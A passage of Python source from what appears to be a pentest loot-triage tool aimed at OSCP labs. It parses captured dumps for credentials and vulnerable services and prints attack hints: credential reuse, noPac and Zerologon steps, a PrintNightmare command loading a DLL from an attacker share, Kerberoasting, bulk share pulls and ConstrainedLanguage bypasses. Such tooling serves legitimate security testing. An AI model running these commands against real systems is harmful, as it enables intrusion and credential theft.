#   VulnStatus:  Appears Vulnerable
_WESNG_VULN = re.compile(
    r'(?im)Title\s*:\s*([^\r\n]{4,120})\s*\n[\s\S]{0,300}?'
    r'(?:MSBulletin|MSKB|BulletinKB|KB Article|KB)\s*:\s*([A-Za-z0-9\-_]{2,40})\s*\n[\s\S]{0,300}?'
    r'CVE(?:ID)?\s*:\s*(CVE-\d{4}-\d{4,7})[\s\S]{0,300}?'
    r'(?:VulnStatus|Status)\s*:\s*((?:Appears\s+Vulnerable|Vulnerable|likely|likely vulnerable)[^\r\n]*)'
)
# PrivescCheck / Sherlock JSON missing-patch:
#   {"VulnerabilityName": "MS16-135", "CVE": "CVE-2016-7255"}
_PE_JSON_VULN = re.compile(
    r'"(?:VulnerabilityName|Vulnerability)"\s*:\s*"([A-Za-z0-9\-_]{3,40})"'
    r'[\s\S]{0,200}?"CVE"\s*:\s*"(CVE-\d{4}-\d{4,7})"'
)


def _multiline_passes(path, report, store):
    """File-level passes that need multi-line context. iter-12: head read
    raised from 200 KB to 4 MB so secretsdump/SCCM logs/mimikatz dumps aren't
    silently truncated. Patterns use bounded `.{0,N}?` lazy spans so 4 MB is
    safe (no catastrophic backtracking on adversarial input - verified)."""
    # iter-12: read via filters.read_text() so UTF-16LE / UTF-8 BOM /
    # gz/bz2/xz are all handled by ONE code path. Also de-NULs by leaving
    # them in (downstream multi-line regexes don't anchor on NUL).
    text = filters.read_text(path, max_bytes=4 * 1024 * 1024)
    if not text:
        return
    from analyzers.ingest.evidence import Evidence
    from analyzers.patterns import HASHES

    # iter-24: PowerShell line continuation `\r?\n + leading whitespace
    # joins logical commands. A history file with
    #     Set-LocalUser -Name admin -Password (ConvertTo-SecureString `
    #         -String "P@ssw0rd!" -AsPlainText -Force)
    # is one logical command but the existing regex anchors per-line.
    # Normalise BEFORE the per-line matchers so `_PS_CONVERT_SECRET et al.
    # see the joined form. Only apply to PowerShell-ish files to keep
    # the rest of the per-line matchers intact (line numbers in PS files
    # may shift by one - acceptable since the captured secret is what
    # matters).
    low = path.lower()
    if (low.endswith((".ps1", ".psm1", ".ps1xml", ".psd1"))
            or "powershell" in low or "consolehost_history" in low):
        text = re.sub(r'`[ \t]*\r?\n[ \t]+', ' ', text)

    def _ln(m):
        return text[: m.start()].count("\n") + 1

    # iter-12 scope-bleed guard: reject a multi-line match where a *second*
    # occurrence of the record-anchor key sits between the captures, meaning
    # the lazy `.{0,N}?` walked across a sibling record.
    def _no_bleed(m, first_grp, last_grp, anchor_rx):
        span = text[m.start(first_grp):m.start(last_grp)]
        return not anchor_rx.search(span)

    # iter-12 scope-bleed anchor regexes (look for repeated record headers
    # inside a multi-line match - signals lazy span walked across siblings).
    _NAA_BLEED = re.compile(r'(?i)NetworkAccess(?:Account|Username)')
    _MK_USER_BLEED = re.compile(r'(?i)\*\s*Username\s*:')
    _MK_RID_BLEED = re.compile(r'(?i)\bRID\s*:\s*[0-9a-f]+\s*\(\d+\)')
    _MK_CRED_BLEED = re.compile(r'(?i)\*\*\*\s*CREDENTIAL\s*\*\*\*')
    _SAM_BLEED = re.compile(r'(?i)\bSamAccountName\s*:')
    _LAZAGNE_BLEED = re.compile(r'(?im)^\s*(?:URL|Login|Username)\s*:')
    # iter-168: fresh `Target: Domain:target=` between our capture spans
    # signals a cmdkey /list block with no User: line - the missing block
    # made us pair Target[N] with User[N+1].
    _CMDKEY_BLEED = re.compile(r'(?i)^\s*Target\s*:\s*Domain:target=', re.MULTILINE)
    # iter-170: fresh `Title:` line between wesng CVE and VulnStatus signals
    # a wesng block missing its VulnStatus line - the missing block made us
    # pair Title[N]/CVE[N] with VulnStatus[N+1], falsely marking block N as
    # "Appears Vulnerable".
    _WESNG_BLEED = re.compile(r'(?im)^\s*Title\s*:')
    # iter-171: same cross-block failure mode in PowerShell transcript
    # blocks (2+ transcripts logged sequentially) and PrivescCheck JSON
    # (vuln objects with no CVE field). Anchors are the block-starting
    # marker in each case.
    _PS_TRANSCRIPT_BLEED = re.compile(r'Windows PowerShell transcript start')
    _PE_VULN_BLEED = re.compile(r'"(?:VulnerabilityName|Vulnerability)"\s*:')
    # iter-172: partial IMDS captures (Metadata endpoint response missing
    # SecretAccessKey but present in the next role dump) would mispair
    # AccessKeyId[N] with SecretAccessKey[N+1].
    _IMDS_BLEED = re.compile(r'"AccessKeyId"\s*:')

    # SCCM NAA
    for m in _SCCM_NAA_MULTI.finditer(text):
        if not _no_bleed(m, 1, 2, _NAA_BLEED):
            continue
        u, p = m.group(1).strip(), m.group(2).strip()
        if filters.is_placeholder(p):
            continue
        report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                   f"SCCM NAA: {u}:{p}",
                   hint="Network Access Account - typically a domain account; reuse for SMB/WinRM")
        if store is not None:
            store.add(Evidence(kind="plaintext", user=u, plaintext=p, source=path, line=_ln(m)))

    # iter-184: CIFS credentials file. Filename gate: only fire on paths
    # that look like a mount.cifs credentials file. Real files include
    # /etc/cifs.creds, /etc/samba/*.creds, /root/.smbcreds, /etc/mount.
    # cifs.creds, or any filename containing 'cifs' + 'creds'. Also allow
    # bare '.smbcreds' / '.cifs' extensions.
    _plow_cf = path.lower().replace("\\", "/")
    _base_cf = _plow_cf.rsplit("/", 1)[-1]
    _cifs_gate = (("cifs" in _plow_cf and "cred" in _base_cf) or
                  _base_cf in (".smbcreds", ".cifscreds", "smbcreds",
                               "cifscreds", "cifs.creds", "smb.creds")
                  or _base_cf.endswith((".smbcreds", ".cifscreds"))
                  or "/samba/" in _plow_cf and "cred" in _base_cf)
    if _cifs_gate:
        for m in _CIFS_CREDS.finditer(text):
            u, p = m.group(1).strip(), m.group(2).strip()
            dom = (m.group(3) or "").strip()
            if not p or filters.is_placeholder(p) or filters.is_placeholder(u):
                continue
            _u_sh_cf = u.replace("'", "'\\''")
            _p_sh_cf = p.replace("'", "'\\''")
            _dom_disp = f"\\\\{dom}\\" if dom else ""
            report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                       f"CIFS creds file: {_dom_disp}{u}:{p}",
                       hint=(f"mount.cifs //<host>/<share> /mnt -o "
                             f"credentials={path},uid=root  |  reuse: nxc smb "
                             f"<host> -u '{_u_sh_cf}' -p '{_p_sh_cf}'"
                             + (f" -d '{dom}'" if dom else "")))
            if store is not None:
                store.add(Evidence(kind="plaintext", user=u, plaintext=p,
                                   domain=dom, source=path, line=_ln(m)))

    # iter-188: OpenVPN .ovpn inline <auth-user-pass> block. Filename gate:
    # only fire on .ovpn / .conf paths (some ops rename .ovpn to .conf) OR
    # when the surrounding text contains typical OpenVPN markers (`client\n`,
    # `remote <host> <port>`, `proto udp/tcp`, `dev tun`). Doc-file gate.
    _ovpn_gate = (_plow_cf.endswith((".ovpn", ".conf"))
                  or "openvpn" in _plow_cf
                  or bool(re.search(r'(?m)^(?:client|remote\s+\S+|dev\s+tun|proto\s+(?:tcp|udp))\b', text)))
    if _ovpn_gate and not filters.is_doc_file(path):
        for m in _OVPN_AUTH.finditer(text):
            u, p = m.group(1).strip(), m.group(2).strip()
            if not p or filters.is_placeholder(p) or _is_cli_placeholder(u):
                continue
            _u_sh_ov = u.replace("'", "'\\''")
            _p_sh_ov = p.replace("'", "'\\''")
            report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                       f"OpenVPN inline cred: {u}:{p}",
                       hint=(f"connect: openvpn --config {path}  |  reuse as "
                             f"OS cred: nxc smb <host> -u '{_u_sh_ov}' "
                             f"-p '{_p_sh_ov}'  (VPN + OS creds often shared)"))
            if store is not None:
                store.add(Evidence(kind="plaintext", user=u, plaintext=p,
                                   source=path, line=_ln(m)))

    # iter-201: Grafana INI admin creds. Filename-gated to grafana.ini /
    # defaults.ini or path segment 'grafana' or `[security]` header AND
    # any of `admin_password=`/`secret_key=` markers in the file.
    _plow_gf = path.lower().replace("\\", "/")
    _grafana_gate = ("grafana" in _plow_gf
                     or _plow_gf.endswith(("grafana.ini", "defaults.ini"))
                     or ("[security]" in text[:8000]
                         and "admin_password" in text[:8000]
                         and "grafana" in text[:8000].lower()))
    if _grafana_gate and not filters.is_doc_file(path):
        _gf_seen = set()
        for m in _GRAFANA_ADMIN.finditer(text):
            u, p = m.group(1).strip(), m.group(2).strip()
            key = (u, p)
            if key in _gf_seen:
                continue
            _gf_seen.add(key)
            if _is_cli_placeholder(u):
                continue
            # DON'T reject filters.is_placeholder(p) here - `admin` is the
            # Grafana DEFAULT password. is_placeholder("admin") returns True
            # but it's real loot on any stock install.
            _is_default = p.lower() in ("admin", "grafana", "changeme")
            _u_sh_gf = u.replace("'", "'\\''")
            _p_sh_gf = p.replace("'", "'\\''")
            _sev = "CRITICAL" if _is_default else "CRITICAL"
            _tag = " (DEFAULT - never rotated)" if _is_default else ""
            report.add(_sev, "CRED PAIRS", path, _ln(m),
                       f"Grafana admin: {u}:{p}{_tag}",
                       hint=(f"curl -u '{_u_sh_gf}:{_p_sh_gf}' "
                             f"http://<host>:3000/api/user  |  API URL panel "
                             f"editor / SSRF via ds_proxy - authenticated "
                             f"plugin RCE via Grafana < 9.5.3"))
            if store is not None:
                store.add(Evidence(kind="plaintext", user=u, plaintext=p,
                                   source=path, line=_ln(m)))

    # iter-201: Airflow sql_alchemy_conn - DB connection URI with creds.
    # Filename-gated to airflow.cfg (also handles Airflow env-var dump).
    _airflow_gate = ("airflow" in _plow_gf
                     or _plow_gf.endswith(("airflow.cfg",))
                     or "sql_alchemy_conn" in text[:8000])
    if _airflow_gate and not filters.is_doc_file(path):
        _af_seen = set()
        for m in _AIRFLOW_CONN.finditer(text):
            scheme, u, p, host = (m.group(1), m.group(2), m.group(3), m.group(4))
            port = m.group(5) or ""
            db = m.group(6) or ""
            key = (u, p, host)
            if key in _af_seen:
                continue
            _af_seen.add(key)
            if _is_cli_placeholder(u) or filters.is_placeholder(p):
                continue
            _u_sh_af = u.replace("'", "'\\''")
            _p_sh_af = p.replace("'", "'\\''")
            _host_shown = host + (f":{port}" if port else "")
            _db_shown = f"/{db}" if db else ""
            report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                       f"Airflow metadata DB ({scheme}): {u}:{p} @ "
                       f"{_host_shown}{_db_shown}",
                       hint=(f"psql -U '{_u_sh_af}' -h {host}"
                             f"{' -p ' + port if port else ''} "
                             f"{'-d ' + db if db else ''}  |  Airflow REST: "
                             f"POST /api/v1/dags/<id>/dagRuns with runId - "
                             f"trigger BashOperator for RCE"))
            if store is not None:
                store.add(Evidence(kind="plaintext", user=u, plaintext=p,
                                   host=host, source=path, line=_ln(m)))

    # iter-200: nmap NSE script VULNERABLE markers + SMB signing check.
    # Doc-file gated. Per-CVE hint routes to concrete exploit tooling.
    if not filters.is_doc_file(path):
        _script_hints = {
            "smb-vuln-ms17-010": ("MS17-010 (EternalBlue / EternalRomance)",
                "PoC: use metasploit ms17_010_eternalblue (ONLY on Windows 7/2008 "
                "R2 targets; NOT on Windows 10 - use ETERNAL_SYNERGY variant). "
                "Manual: python2 zzz_exploit.py + AutoBlue-MS17-010 shellcode"),
            "smb-vuln-ms08-067": ("MS08-067 netapi RCE",
                "PoC: searchsploit -m 40279; targets XP/2003 - rare on modern "
                "labs but comes up in HTB retro boxes"),
            "smb-vuln-cve-2017-7494": ("SambaCry (Samba < 4.6.4)",
                "PoC: exploit/linux/samba/is_known_pipename in metasploit "
                "(ONE-target-only quota on exam) OR manual .so upload + "
                "call_pipename trigger"),
            "smb-vuln-conficker": ("Conficker check (worm hostility, not RCE)",
                "intel only"),
            "rdp-vuln-ms12-020": ("MS12-020 RDP DoS",
                "DoS only - not useful for exam; note the target as legacy"),
            "rdp-vuln-cve-2019-0708": ("BlueKeep (CVE-2019-0708)",
                "PoC: metasploit rdp_cve_2019_0708_bluekeep_rce (unreliable "
                "on default configs; needs precise hal.dll offsets). ONLY on "
                "Win 7/2008/XP-Embedded targets"),
            "ssl-heartbleed": ("Heartbleed (CVE-2014-0160)",
                "PoC: python heartbleed.py <host> 443 or nmap script "
                "recovery; grep memory dump for session tokens + creds"),
            "ssl-poodle": ("SSLv3 POODLE (CVE-2014-3566)",
                "protocol downgrade intel; not directly exploitable"),
            "ftp-vsftpd-backdoor": ("vsftpd 2.3.4 backdoor CVE-2011-2523",
                "PoC: metasploit vsftpd_234_backdoor OR nc <host> 21 with "
                "smiley user"),
            "http-vuln-cve-2017-5638": ("Apache Struts2 (Jakarta)",
                "PoC: metasploit exploit/multi/http/struts2_content_type_ognl "
                "(one-target quota); manual: curl -H 'Content-Type: %{...}"),
            # iter-233: modern AD-attack CVEs that show up on OSCP+
            # retired AD labs. Hints call out the compliance trade-off
            # explicitly - Zerologon breaks the DC for other testers,
            # noPac is safe, PrintNightmare crashes spooler.
            "smb-vuln-cve-2020-1472": ("Zerologon (CVE-2020-1472)",
                "WARNING: exploit RESETS DC machine-account password to "
                "empty then requires reset - if the restore fails it "
                "BREAKS THE DC for every other exam taker on the shared "
                "lab. On OSCP+ prefer noPac or Kerberoast paths instead. "
                "If confirmed vuln + no other option: python "
                "zerologon_tester.py <dc> <dc-netbios> checks; then "
                "cve-2020-1472-exploit.py to reset; secretsdump.py -no-"
                "pass -just-dc <domain>/<dc>\\$@<dc-ip>; restore "
                "immediately with reinstall_original_pw.py"),
            "smb-vuln-cve-2021-42278": ("noPac / sAMAccountName spoofing "
                "(CVE-2021-42278 + 42287)",
                "SAFE for shared labs - doesn't touch DC state. "
                "impacket-noPac.py -dc-ip <dc-ip> <domain>/<user>:<pw> "
                "-shell for direct SYSTEM shell on the DC. Requires ANY "
                "domain user cred - windapsearch/kerbrute to enumerate "
                "one first"),
            "smb-vuln-cve-2021-1675": ("PrintNightmare (CVE-2021-1675 / "
                "34527)",
                "exam-legal path: python printnightmare.py <target> "
                "<domain>/<user>:<pw> '\\\\<smb-attacker>\\share\\evil."
                "dll' - drops the DLL to spooler which SYSTEM-executes. "
                "WARNING: often crashes spooler; may DoS the printer "
                "service for other testers. Prefer other paths if this "
                "is a shared DC"),
            "smb-vuln-cve-2022-26923": ("Certifried / cert-based DA "
                "elevation (CVE-2022-26923)",
                "exam-legal: certipy shadow auto -u <user>@<domain> -p "
                "<pw> -account <machine>$; then Rubeus/impacket ask "
                "PKINIT with the forged cert; direct DA. Requires AD CS "
                "Enterprise CA reachable."),
        }
        _script_seen = set()
        for m in _NMAP_VULN_SCRIPT.finditer(text):
            script = m.group(1).lower()
            if script in _script_seen:
                continue
            _script_seen.add(script)
            label, hint = _script_hints.get(script,
                ("nmap NSE flagged vulnerable",
                 f"searchsploit --nmap - lookup by NSE script id / CVE tag"))
            report.add("HIGH", "INTERESTING FILES", path, _ln(m),
                       f"nmap NSE VULNERABLE: {script} - {label}",
                       hint=hint)

        # SMB signing not required: MEDIUM RECON with compliance note.
        for m in _SMB_SIGNING_UNREQ.finditer(text):
            report.add("MEDIUM", "RECON", path, _ln(m),
                       "SMB signing enabled but not required (SMB relay-vector, "
                       "but OSCP+ BANS relay tools like Responder/ntlmrelayx)",
                       hint=("intel only for the exam - `SMB signing not "
                             "required` normally invites NTLM relay, but "
                             "Responder / ntlmrelayx are exam-forbidden. "
                             "Note the target for post-exam followup / "
                             "compliance report."))
            break  # dedup - one signing check per file is enough

        # iter-224: SMB null-session confirmed. One per file (dedup).
        _null_m = _SMB_NULL_SESSION.search(text)
        if _null_m:
            # Try to find the target host in nearby context.
            _null_host = re.search(
                r'(?im)^Nmap\s+scan\s+report\s+for\s+([\w.\-:]+)|'
                r'(?:Server|Target)\s+([\w.\-]+)\s+allows',
                text[:16384])
            _nh = ((_null_host.group(1) or _null_host.group(2))
                    if _null_host else "<smb-host>")
            report.add("HIGH", "SECRET-SIDECHANNEL", path, _ln(_null_m),
                       f"SMB null session accepted on {_nh} - unauth "
                       f"enumeration open",
                       hint=(f"impacket-lookupsid '{_nh}'/  |  nxc smb "
                             f"{_nh} -u '' -p ''  |  enum4linux-ng -A "
                             f"{_nh}  |  smbclient -N -L //{_nh}  |  "
                             f"impacket-samrdump -no-pass '{_nh}'  "
                             f"|  extract users + password policy "
                             f"WITHOUT credentials (exam-legal - "
                             f"built-in unauth SMB dialects, not "
                             f"Responder/relay which are banned)"))

        # iter-224: SMB guest account accepted (nmap smb-enum-shares
        # `account_used: guest` line or empty).
        _guest_m = _SMB_GUEST_ACCOUNT.search(text)
        if _guest_m:
            _guest_val = _guest_m.group(1) or "(anonymous)"
            report.add("HIGH", "SECRET-SIDECHANNEL", path, _ln(_guest_m),
                       f"SMB guest/anon session accepted ({_guest_val}) "
                       f"- enumerate shares without creds",
                       hint=("nxc smb <host> -u guest -p ''  |  "
                             "smbclient -U 'guest%' -L //<host>  |  "
                             "smbmap -u guest -p '' -H <host>  |  read "
                             "any share showing READ perms - guest "
                             "access frequently allows access to file "
                             "shares intended for domain users"))

        # iter-224: Anonymous READ on a non-IPC$ share = direct loot.
        _anon_ms = list(_SMB_ANON_ACCESS.finditer(text))
        _anon_shares = set()
        for _am in _anon_ms:
            _share_name = _am.group(1).strip()
            _access = _am.group(2).strip()
            if _share_name.upper() == "IPC$":
                continue  # IPC$ null-read is normal
            if _share_name in _anon_shares:
                continue
            _anon_shares.add(_share_name)
            report.add("HIGH", "SECRET-SIDECHANNEL", path, _ln(_am),
                       f"SMB anonymous {_access} on share `{_share_name}` "
                       f"- direct read/write without creds",
                       hint=(f"smbclient -N //<host>/{_share_name}  |  "
                             f"recursive: smbclient -N "
                             f"//<host>/{_share_name} -c "
                             f"'recurse; ls'  |  bulk pull: "
                             f"smbclient -N //<host>/{_share_name} -c "
                             f"'prompt; recurse; mget *'  |  grep "
                             f"pulled files for .kdbx / .config / "
                             f"web.config / unattend.xml"))

    # iter-225: FTP anonymous login accepted. Two orthogonal signals -
    # nmap NSE result OR captured client session with 230 code near a
    # USER anonymous attempt. Emits ONE HIGH per file (dedup).
    if not filters.is_doc_file(path):
        _ftp_hit = False
        # Signal A: nmap `ftp-anon` NSE.
        _fa_m = _FTP_ANON_NMAP.search(text)
        if _fa_m:
            _ftp_host_m = re.search(
                r'(?im)^Nmap\s+scan\s+report\s+for\s+([\w.\-:]+)',
                text[:16384])
            _fh = _ftp_host_m.group(1) if _ftp_host_m else "<ftp-host>"
            report.add("HIGH", "SECRET-SIDECHANNEL", path, _ln(_fa_m),
                       f"FTP anonymous login allowed on {_fh}",
                       hint=(f"ftp -a {_fh}  |  or: curl -s "
                             f"ftp://anonymous:anon@{_fh}/  |  bulk "
                             f"pull: wget -m --no-passive ftp://"
                             f"anonymous:anon@{_fh}/  |  grep pulled "
                             f"for web.config, unattend.xml, backup "
                             f"archives, .kdbx, id_rsa, .pgpass, "
                             f".my.cnf"))
            _ftp_hit = True

        # Signal B: captured ftp session with 230 response near USER
        # anonymous. Both must appear in the first 16 KB.
        if not _ftp_hit:
            _atm = _FTP_ANON_ATTEMPT.search(text[:16384])
            _lgm = _FTP_ANON_LOGIN.search(text[:16384])
            if _atm and _lgm:
                # Require the login response to come AFTER the attempt.
                if _lgm.start() > _atm.start() and (
                        _lgm.start() - _atm.start()) < 500:
                    # iter-231 audit fix: reject when the operator's
                    # anon attempt was FOLLOWED BY a second Name/USER
                    # login before the 230 - that means anon was
                    # REJECTED (e.g. 530 Login incorrect.) and a real
                    # cred is what actually succeeded. Also reject
                    # when a `530` failure code appears BETWEEN the
                    # anon attempt and the 230.
                    _between = text[_atm.end():_lgm.start()]
                    _second_login = re.search(
                        r'(?im)^(?:USER\s+(?!anonymous)\w|'
                        r'Name\s*\([^)]{0,80}\)\s*:\s*(?!anonymous)\w|'
                        r'Login\s*:\s*(?!anonymous)\w)',
                        _between)
                    _rejected = re.search(
                        r'(?im)^\s*530\s+(?:Login\s+incorrect|'
                        r'Login\s+authentication\s+failed|'
                        r'Anonymous\s+access\s+denied)',
                        _between)
                    if _second_login or _rejected:
                        pass  # anon actually failed
                    else:
                        report.add("HIGH", "SECRET-SIDECHANNEL", path,
                                   _ln(_lgm),
                                   "FTP anonymous login accepted "
                                   "(captured session with 230 response)",
                                   hint=("cd + ls to enumerate ftp root"
                                         "  |  curl ftp://<host>/ for a "
                                         "full listing  |  wget -m ftp://"
                                         "anonymous:anon@<host>/  |  "
                                         "writable root = webshell drop "
                                         "if paired with webroot"))

    # iter-226: VNC 5900 unauth / weak-auth intel. Signal (A) is the
    # vnc-info NSE block with Security types - dispositive on auth
    # mode. Signal (B) is the bare `5900/tcp open vnc` port line
    # for MEDIUM baseline. Doc-file gate applies.
    if not filters.is_doc_file(path):
        _vnc_emitted = False
        _vim = _VNC_INFO_BLOCK.search(text)
        if _vim:
            _proto = _vim.group(1) or "?"
            _sec_block = _vim.group(2) or ""
            _vnc_host_m = re.search(
                r'(?im)^Nmap\s+scan\s+report\s+for\s+([\w.\-:]+)',
                text[:16384])
            _vnc_target = (_vnc_host_m.group(1) if _vnc_host_m
                            else "<vnc-host>")
            if _VNC_SEC_NONE.search(_sec_block):
                # None (1) = no auth. Highest severity.
                report.add("HIGH", "SECRET-SIDECHANNEL", path,
                           _ln(_vim),
                           f"VNC {_vnc_target}:5900 NO AUTH (RFB "
                           f"protocol {_proto}, Security None) - "
                           f"direct desktop access",
                           hint=(f"vncviewer {_vnc_target}  |  or: "
                                 f"vncviewer {_vnc_target}::5900  |  "
                                 f"snapshot: xvfb + vncsnapshot  |  "
                                 f"if headless: check for pw file at "
                                 f"~/.vnc/passwd for reuse elsewhere"))
                _vnc_emitted = True
            elif _VNC_SEC_VNCAUTH.search(_sec_block):
                # VNC Authentication (2) = weak DES challenge.
                report.add("MEDIUM", "SECRET-SIDECHANNEL", path,
                           _ln(_vim),
                           f"VNC {_vnc_target}:5900 weak auth type 2 "
                           f"(DES challenge, RFB {_proto}) - "
                           f"credential-crackable",
                           hint=(f"snap pw with tightvncviewer + "
                                 f"tcpdump then crack with john/"
                                 f"hashcat -m 5850 (VNC Auth)  |  or "
                                 f"try FOUND-cred reuse: vncviewer "
                                 f"-passwd <file> {_vnc_target}  |  "
                                 f"NO online brute forcers (hydra "
                                 f"vnc-form is NOT exam-legal)"))
                _vnc_emitted = True

        # Fallback: bare 5900/tcp open vnc line → MEDIUM baseline.
        if not _vnc_emitted:
            _vpm = _VNC_PORT_LINE.search(text)
            if _vpm:
                _vnc_host_m2 = re.search(
                    r'(?im)^Nmap\s+scan\s+report\s+for\s+([\w.\-:]+)',
                    text[:16384])
                _vnc_target2 = (_vnc_host_m2.group(1)
                                 if _vnc_host_m2 else "<vnc-host>")
                report.add("MEDIUM", "RECON", path, _ln(_vpm),
                           f"VNC 5900 open on {_vnc_target2} - "
                           f"check auth mode",
                           hint=(f"nmap --script vnc-info -p 5900 "
                                 f"{_vnc_target2}  |  or: "
                                 f"vncviewer {_vnc_target2} to see "
                                 f"prompt  |  common default creds: "
                                 f"password, secret, admin, or empty"))

    # iter-227: LDAP anonymous bind confirmed via rootDSE dump. Fires
    # when we can see any of the rootDSE attributes (namingContexts,
    # defaultNamingContext, dnsHostName) in captured output. These
    # attributes are UNREADABLE without a successful bind, so their
    # presence = confirmed anonymous bind + rootDSE readable. Doc-file
    # gate applies.
    if not filters.is_doc_file(path):
        _ldap_nc = _LDAP_NAMING_CTX.search(text)
        _ldap_dnc = _LDAP_DEFAULT_NC.search(text)
        _ldap_dns = _LDAP_ROOTDSE_HOSTNAME.search(text)
        # Require any TWO of the three attributes together - a single
        # `namingContexts:` mention in prose (docs, tests) could be
        # accidental, but seeing two rootDSE attrs on the same target
        # is dispositive.
        _ldap_signals = sum(bool(x) for x in (_ldap_nc, _ldap_dnc,
                                                _ldap_dns))
        if _ldap_signals >= 2:
            _anchor_l = _ldap_dnc or _ldap_nc or _ldap_dns
            _base_dn = (_ldap_dnc.group(1) if _ldap_dnc
                         else (_ldap_nc.group(1) if _ldap_nc
                                else "DC=corp,DC=local"))
            _dc_fqdn = (_ldap_dns.group(1) if _ldap_dns
                         else "<dc-host>")
            # Try to find target IP from surrounding nmap header.
            _ldap_host_m = re.search(
                r'(?im)^Nmap\s+scan\s+report\s+for\s+([\w.\-:]+)',
                text[:16384])
            _ldap_ip = (_ldap_host_m.group(1) if _ldap_host_m
                         else _dc_fqdn)
            # iter-244 + iter-246: AS-REP + Kerberoastable extraction
            # runs as a standalone block below now (no longer nested
            # inside the rootDSE-gated LDAP anon-bind branch).

            report.add("HIGH", "SECRET-SIDECHANNEL", path,
                       _ln(_anchor_l),
                       f"LDAP anonymous bind confirmed - rootDSE "
                       f"dumped ({_dc_fqdn}, base={_base_dn})",
                       hint=(f"impacket-lookupsid '{_ldap_ip}'/  |  "
                             f"windapsearch -u '' -p '' --dc-ip "
                             f"{_ldap_ip} -U (users) -G (groups)  |  "
                             f"authenticated later: ldapsearch -x "
                             f"-H ldap://{_ldap_ip} -D "
                             f"'<user>@{_dc_fqdn.split('.', 1)[-1] if '.' in _dc_fqdn else '<domain>'}' "
                             f"-w '<pw>' -b '{_base_dn}' "
                             f"'(objectclass=user)'  |  AS-REP roast: "
                             f"impacket-GetNPUsers "
                             f"{_dc_fqdn.split('.', 1)[-1] if '.' in _dc_fqdn else '<domain>'}/ "
                             f"-dc-ip {_ldap_ip} -request -no-pass"))

    # iter-246: hoisted iter-244 AS-REP + Kerberoastable extraction to
    # a standalone block. Prior impl was nested inside the iter-227
    # rootDSE-signal check so bare LDIF captures (no namingContexts /
    # dnsHostName in the same file) missed the extraction entirely.
    #
    # New gating: fires when the file contains BOTH the LDIF-shape
    # anchors (`dn:` + `sAMAccountName:`) AND at least one user block
    # matches. Extra content-signal gate rejects prose/tutorial FPs.
    if not filters.is_doc_file(path):
        _ldap_ctx = ("dn:" in text[:16384]
                     and "sAMAccountName" in text[:16384])
        if _ldap_ctx:
            # Best-effort domain / DC-IP extraction from context.
            _dc_fqdn_hoist = "<dc-host>"
            _dc_ip_hoist = "<dc-ip>"
            _dom_hoist = "<domain>"
            _hdns_m = re.search(
                r'(?im)^\|?\s*(?:dnsHostName|dNSHostName)\s*:\s*'
                r'([\w\-.]{1,120})', text[:16384])
            if _hdns_m:
                _dc_fqdn_hoist = _hdns_m.group(1)
                if '.' in _dc_fqdn_hoist:
                    _dom_hoist = _dc_fqdn_hoist.split('.', 1)[-1]
            _hnmap_m = re.search(
                r'(?im)^Nmap\s+scan\s+report\s+for\s+([\w.\-:]+)',
                text[:16384])
            if _hnmap_m:
                _dc_ip_hoist = _hnmap_m.group(1)
            # Extract dn base from any `dn:` line to infer the domain
            # as a fallback (e.g., `DC=corp,DC=local` → corp.local).
            if _dom_hoist == "<domain>":
                _dc_parts_m = re.search(
                    r'(?im)dn:[^\r\n]*?((?:DC=[^,\s\r\n]+,?)+)',
                    text[:16384])
                if _dc_parts_m:
                    _dc_parts = re.findall(
                        r'DC=([\w\-]+)', _dc_parts_m.group(1))
                    if _dc_parts:
                        _dom_hoist = ".".join(_dc_parts)

            _asrep_seen_h = set()
            for _um in _LDAP_USER_BLOCK.finditer(text[:65536]):
                _sam = _um.group(2).strip()
                try:
                    _uac = int(_um.group(3))
                except (ValueError, TypeError):
                    continue
                if _uac & 0x400000 and _sam not in _asrep_seen_h:
                    _asrep_seen_h.add(_sam)
                    _sam_sh = _sam.replace("'", "'\\''")
                    report.add("HIGH", "RECON", path, _ln(_um),
                               f"AS-REP-eligible user (UAC "
                               f"DONT_REQ_PREAUTH): {_sam}",
                               hint=(f"impacket-GetNPUsers "
                                     f"{_dom_hoist}/ -dc-ip "
                                     f"{_dc_ip_hoist} -usersfile "
                                     f"<(echo '{_sam_sh}') -request "
                                     f"-no-pass 2>/dev/null | tee "
                                     f"{_sam}.asrep  |  hashcat -m "
                                     f"18200 {_sam}.asrep rockyou.txt "
                                     f"-r rules/best64.rule"))
            _spn_seen_h = set()
            for _sm in _LDAP_SPN_BLOCK.finditer(text[:65536]):
                _sam_s = _sm.group(1).strip()
                _spn = _sm.group(2).strip()[:80]
                if _sam_s in _spn_seen_h:
                    continue
                _spn_seen_h.add(_sam_s)
                report.add("HIGH", "RECON", path, _ln(_sm),
                           f"Kerberoastable service account: {_sam_s} "
                           f"(SPN: {_spn})",
                           hint=(f"needs any-domain-user cred: "
                                 f"impacket-GetUserSPNs {_dom_hoist}/"
                                 f"<user>:<pw> -dc-ip {_dc_ip_hoist}"
                                 f" -request -outputfile {_sam_s}.tgs"
                                 f"  |  hashcat -m 13100 {_sam_s}.tgs "
                                 f"rockyou.txt -r rules/best64.rule"))

    # iter-245: PowerShell CLM / AMSI / offensive-framework IOCs from
    # captured .ps1 files, PS transcripts, and command-history dumps.
    # Doc-file gate applies. Each signal is single-shot per file
    # (dedup).
    if not filters.is_doc_file(path):
        _clm_m = _PS_CLM_STATE.search(text[:32768])
        if _clm_m:
            _mode = _clm_m.group(1)
            if _mode.lower() == "constrainedlanguage":
                report.add("MEDIUM", "RECON", path, _ln(_clm_m),
                           "PowerShell ConstrainedLanguage mode "
                           "detected - .NET member access + Add-Type "
                           "blocked",
                           hint=("CLM bypass paths:  |  1. downgrade "
                                 "to PS v2 if installed: powershell "
                                 "-Version 2 -Command <payload>  |  "
                                 "2. Runspace via COM: Get-Item "
                                 "cannot instantiate; try "
                                 "InvokeExpression on JEA-scoped "
                                 "endpoint  |  3. GPO bypass: "
                                 "$ExecutionContext.SessionState."
                                 "LanguageMode = 'FullLanguage' "
                                 "(only if not enforced via LSA)  |"
                                 "  4. use signed binaries "
                                 "(installutil.exe, msbuild.exe) "
                                 "with inline C# for TrustedFile "
                                 "path  |  5. C# binary via "
                                 "csc.exe + Add-Type CLM-safe "
                                 "compile is BLOCKED; use "
                                 "windows/wine wrapper"))
            else:
                report.add("INFO", "RECON", path, _ln(_clm_m),
                           f"PowerShell LanguageMode: {_mode} "
                           "(unrestricted; direct .NET works)")

